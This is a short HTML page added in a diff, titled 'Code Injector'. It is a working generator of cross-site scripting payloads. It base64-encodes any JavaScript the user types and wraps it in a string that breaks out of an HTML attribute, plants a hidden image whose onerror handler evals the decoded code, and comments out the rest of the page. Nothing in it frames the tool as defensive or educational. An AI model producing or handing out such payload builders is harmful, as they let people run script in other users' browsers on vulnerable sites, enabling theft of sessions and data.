@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Code Injector</title>
+<style>
+body {filter:invert(1);background:gray}
+
+* {font-family:arial}
+textarea {width:100%;height:300px;font-size:15px}
+button {padding:15px;transform:translate(10px,-5px);background:lightgray}
+button:active {background:gray}
+</style>
+</head>
+<body>
+
+
+<h1>Input code<button onclick="conv()">Convert</button></h1>
+<textarea id="in" placeholder="Example:&#x0a;&#x0a;var text = 'My name Jef!';&#x0a;alert(text);"></textarea>
+
+<h1>Output code<button onclick="cpy(this)">Copy to clipboard</button></h1>
+<textarea id="out" disabled placeholder="Example:&#x0a;&#x0a;var text = 'My name Jef!';&#x0a;alert(text);"></textarea>
+
+<script>
+function conv(){
+document.querySelector("#out").value = `"><img style="display:none" src="x123" onerror='eval(atob("${btoa(document.querySelector("#in").value)}"))'><!--`
+}
+
+function cpy(x){
+	document.querySelector("#out").disabled = false;
+    document.querySelector("#out").select(); //select the text area
+    document.execCommand("copy");
+    document.querySelector("#out").disabled = true;
+    x.innerText = "Copied!"
+    setTimeout(()=>{
+		x.innerText = "Copy to clipboard"
+	}, 500)
+}
+</script>
+
+</body>
+</html>
